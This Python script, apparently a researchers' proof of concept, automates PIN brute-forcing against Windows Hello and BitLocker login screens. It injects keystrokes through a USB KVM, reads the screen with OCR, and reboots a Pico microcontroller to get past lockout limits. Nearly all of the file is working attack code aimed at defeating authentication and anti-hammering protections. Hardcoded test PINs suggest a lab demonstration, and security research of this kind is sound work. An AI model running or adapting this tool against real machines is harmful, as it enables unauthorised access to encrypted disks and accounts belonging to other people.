#!/usr/bin/env python3
#
# SPDX-License-Identifier: GPL-3.0-only
# Copyright (c) 2026 Matti Finder
# Copyright (c) 2026 Julian Prein

from io import BytesIO, TextIOWrapper
import re
import sys
import threading
import time
import os

import serial


READABLE_LINES = [
    b'--frame\r\n',
    b'Content-Type: image/jpeg\r\n',
    b'Content-Length: ',
]

state = "booting"
state_iter = 0
kvm_fifo: TextIOWrapper

curr_pin = 123222


def kvm_phy_restart(delay=3):
    global kvm_fifo
    kvm_fifo.write("/etc/init.d/S03usbdev restart_phy\n")
    time.sleep(delay)


def kvm_press(script, delay=0.2):
    global kvm_fifo
    script = "/root/press-" + script + "\n"
    print("$ " + script, end='', file=sys.stderr)
    kvm_fifo.write(script)
    time.sleep(delay)


def find_in_screen(screen: str, text: str) -> bool:
    return re.sub("[\n\r\t ]", "", text).lower() in re.sub("[\n\r\t ]", "", screen).lower()


def pico_do_serial(msg: bytes, wait_read: bool = False, done_txt = b""):
    con = serial.Serial('/dev/ttyACM0', baudrate=115200, timeout=3)
    con.write(msg)

    if wait_read:
        if done_txt:
            con.read_until(done_txt)
        else:
            con.readall()

    con.close()


def pico_reboot(prompt: bytes = b"", wait_read: bool = False, delay: float = 2):
    print("Rebooting Pico")
    os.system("/usr/bin/picotool reboot -f")
    time.sleep(delay)

    if prompt:
        pico_do_serial(prompt, wait_read)


def hello_restart():
    print("entering reboot key sequence", file=sys.stderr)
    time.sleep(1)
    kvm_press("tab")
    kvm_press("tab")
    kvm_press("tab")
    kvm_press("return")
    kvm_press("down")
    # on shutdown now
    kvm_press("down")
    # on reboot now
    kvm_press("return")
    kvm_press("return")

    time.sleep(13.4)


def ocr_cycle(image_bytes):
    global state
    global state_iter
    global curr_pin
    global kvm_fifo

    image = Image.open(BytesIO(image_bytes))

    state_iter += 1

    if state == "booting":
        image = image.crop((750, 190, 750 + 420, 190 + 200))
    #elif state == "login" or state == "check":
    #    image = image.crop((750, 595, 750 + 420, 595 + 200))
    #    #image = image.crop((750, 600, 750 + 420, 600 + 200))
    #elif state == "check":

    screen = pytesseract.image_to_string(image)
    screen = re.sub("[\n\r\t ]", "", screen).lower()
    print(f"{state}", file=sys.stderr)
    if screen:
        print(screen)

    if state == "booting":
        if not find_in_screen(screen, "Thursday, 2 April"):
            return

        state = "login"
        state_iter = 0
        # sometimes the return comes to early and we're stuck in "login?"
        time.sleep(2)
        kvm_press("return")
        return

    elif state.startswith("login"):
        if state != "login_only" and (find_in_screen(screen, "A1B2C3") or find_in_screen(screen, "several times")):
            print("entering a1b2c3", file=sys.stderr)
            kvm_fifo.write("/root/enter-a1b2c3.sh\n")
            time.sleep(0.7)
            kvm_press("return", 0.5)
            state = "login_only"
            state_iter = 0

        elif find_in_screen(screen, "incorrect PIN too many") or find_in_screen(screen, "restart your device") or find_in_screen(screen, "PIN is disabled"):
            hello_restart()
            pico_reboot(b'r', True)
            pico_reboot(b'a')

            state = "booting"
            state_iter = 0

        elif find_in_screen(screen, "Enter your PIN"):
            # enter PIN
            print(f"entering {curr_pin}", file=sys.stderr)
            for c in str(curr_pin):
                kvm_press(f"number {c}")
            time.sleep(1)
            curr_pin += 1
            state = "checking"
            state_iter = 0

        else:
            if state_iter >= 3:
                print("timeout. trying again with booting", file=sys.stderr)
                state = "booting"
                state_iter = 0

    elif state == "checking":

        #if find_in_screen(screen, "A1B2C3") or find_in_screen(screen, "several times"):
        #    print("entering a1b2c3", file=sys.stderr)
        #    kvm_fifo.write("/root/enter-a1b2c3.sh\n")
        #    time.sleep(0.7)
        #    kvm_press("return", 0.5)
        #    state = "login_only"
        #    state_iter = 0

        if find_in_screen(screen, "incorrect PIN too many") or find_in_screen(screen, "restart your device") or find_in_screen(screen, "PIN is disabled"):
            hello_restart()
            pico_reboot(b'r', True)
            pico_reboot(b'a')

            state = "booting"
            state_iter = 0

        elif find_in_screen(screen, "The PIN is incorrect"):
            kvm_press("return", 0.2)
            state = "login"
            state_iter = 0

    else:
        print(f"success? {curr_pin}")


def hello_ocr(delta: int):
    # $ pip install pytesseract serial
    from PIL import Image
    import pytesseract

    thread = None
    now = 0

    while True:
        line = b''
        for i in range(len(READABLE_LINES)):
            line = sys.stdin.buffer.readline()
            if not line.startswith(READABLE_LINES[i]):
                print("Corrupt input", file=sys.stderr)
                return 1

        if sys.stdin.buffer.readline() != b'\r\n':
            print("Corrupt input", file=sys.stderr)
            return 1

        line = line[len(READABLE_LINES[-1]):].strip()
        size = int(line.decode('ascii'))
        #print(now, time.time())

        image = sys.stdin.buffer.read(size)
        if not image.startswith(b'\xff\xd8'):
            print("Wrong start", file=sys.stderr)
            return 1
        if not image.endswith(b'\xff\xd9'):
            print("Wrong end", file=sys.stderr)
            return 1

        if (now + delta <= time.time()) and (thread is None or not thread.is_alive()):
            thread = threading.Thread(target=ocr_cycle, args=(image,))
            thread.start()
            #print(pytesseract.image_to_string(Image.open(io.BytesIO(image))))
            now = time.time()
        else:
            #print("skip", file=sys.stderr)
            pass

        if sys.stdin.buffer.readline() != b'\r\n':
            print("Corrupt input", file=sys.stderr)
            return 1


def hello_timing_cycle(pin):
    global curr_pin
    global kvm_fifo

    print("waiting for boot")
    time.sleep(40)

    kvm_phy_restart(2)

    kvm_press("return", 0.5)

    # enter PIN
    for i in range(4):
        print(f"entering PIN {i+1} {curr_pin}", file=sys.stderr)
        for c in str(curr_pin):
            kvm_press(f"number {c}", 0.1)
            time.sleep(0.1)
        time.sleep(0.5) # fixme: remove
        kvm_press("return", 0.5)
        if curr_pin == pin:
            print("done")
            exit(0)
        curr_pin+=1

    time.sleep(0.5)

    print("entering a1b2c3", file=sys.stderr)
    kvm_fifo.write("/root/enter-a1b2c3.sh\n")
    time.sleep(0.5)
    kvm_press("return", 0.5)

    print(f"entering PIN 5 {curr_pin}", file=sys.stderr)
    for c in str(curr_pin):
        kvm_press(f"number {c}", 0.1)
    time.sleep(0.5)
    kvm_press("return")
    if curr_pin == pin:
        print("done")
        exit(0)
    curr_pin+=1

    hello_restart()


def hello_timing():
    global curr_pin

    curr_pin = 1000

    while True:
        pico_reboot(b'a')
        hello_timing_cycle(1235)
        pico_reboot(b'r', True)


def bitlocker_cycle(pin):
    global curr_pin

    # We sometimes had problems with the KVM not being recognized as a keyboard after
    # rebooting into the Bitlocker prompt. This is a hack to make sure that the PINs are
    # actually entered and to give the possibility to replug the keyboard (which always
    # fixed the issue for us). Restarting the KVM's USB PHY didn't help here
    # unfortunately.
    option = "n"
    while option == "n":
        #kvm_phy_restart()
        kvm_press(f"number 0")
        print("do you see this? [Yn]")
        option = input()
        kvm_press("backspace")

    print(f"entering PIN {curr_pin}", file=sys.stderr)
    for c in str(curr_pin):
        kvm_press(f"number {c}")
    kvm_press("return")
    if curr_pin == pin:
        print("done")
        exit(0)
    curr_pin += 1
    # first pin takes a bit longer
    time.sleep(1)

    for _ in range(31):
        print(f"entering PIN {curr_pin}", file=sys.stderr)

        # Bitlocker keeps the PIN in the input field, so we just have to change the last
        # digit(s)
        if curr_pin % 100 == 0:
            kvm_press("backspace")
            kvm_press("backspace")
            kvm_press("backspace")
            kvm_press(f"number {(curr_pin % 1000) // 100}")
            kvm_press("number 0")
            kvm_press("number 0")

        elif curr_pin % 10 == 0:
            kvm_press("backspace")
            kvm_press("backspace")
            kvm_press(f"number {(curr_pin % 100) // 10}")
            kvm_press("number 0")

        else:
            kvm_press("backspace")
            kvm_press(f"number {curr_pin % 10}")

        kvm_press("return", 0.5)

        if curr_pin == pin:
            print("done")
            exit(0)

        curr_pin += 1


def bitlocker():
    global curr_pin

    # On Windows Hello we're brute forcing 236 pins (from 1000 to 1235), so do the same
    # here
    curr_pin = 123222

    while True:
        pico_reboot(b'i')

        print("Turning on target", file=sys.stderr)
        kvm_press("powerbutton")

        print("Press enter to start pin entry")
        input()

        bitlocker_cycle(123457)

        pico_reboot()
        pico_do_serial(b"r", True, b"done\n")

        kvm_press("powerbutton", 2)
        #kvm_press("ctrlaltentf", 2)


def main(args):
    # TODO: do we want this?
    delta = 0

    if len(args) > 0:
        global kvm_fifo
        kvm_fifo = open(args[0], "a", 1)
    else:
        print("need a file path", file=sys.stderr)
        return 1

    if len(args) > 1:
        delta = int(args[1])

    target = input("Enter target [bh]: ")

    if target.lower() == "b":
        bitlocker()
    if target.lower() == "h":
        # the OCR version was sometimes pretty unreliable so we also implemented a
        # timing-based one
        #hello_timing()
        hello_ocr(delta)
    else:
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
